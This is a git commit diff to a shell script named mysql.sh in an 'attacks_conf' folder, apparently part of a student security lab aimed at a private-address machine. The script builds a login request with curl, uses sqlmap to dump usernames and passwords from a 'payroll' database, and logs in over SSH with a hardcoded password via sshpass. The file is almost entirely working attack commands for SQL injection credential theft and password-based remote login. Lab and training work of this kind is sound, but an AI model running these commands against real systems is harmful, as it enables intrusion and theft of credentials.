a19c7ef5d805fb722095c03a0a42874baec2d0d8
Bartłomiej Matejuk <bartek.matejuk.szkola@gmail.com>
2024-04-28 13:55:19 +0200

    edit mysql.sh
    Co-authored-by: 254044 <162146517+254044@users.noreply.github.com>

--- attacks_conf/mysql.sh
+++ attacks_conf/mysql.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 
-
-sqlmap -r /home/kali/baw-git/attacks_conf/request.txt --batch -D payroll -T users -C username,password --dump
+curl -H "Content-Type: text/plain" http://192.168.100.86/payroll_app.php --trace-ascii /dev/stdout -d "user=123&password=345&s=OK" POST | head -n 12 | grep : | awk '{print $2,$3,$4}' > request.txt
+sqlmap -r request.txt --batch -D payroll -T users -C username,password --dump
 
 PASSWORD=help_me_obiwan
 sshpass -p $PASSWORD ssh -q leia_organa@192.168.100.86 'groups'
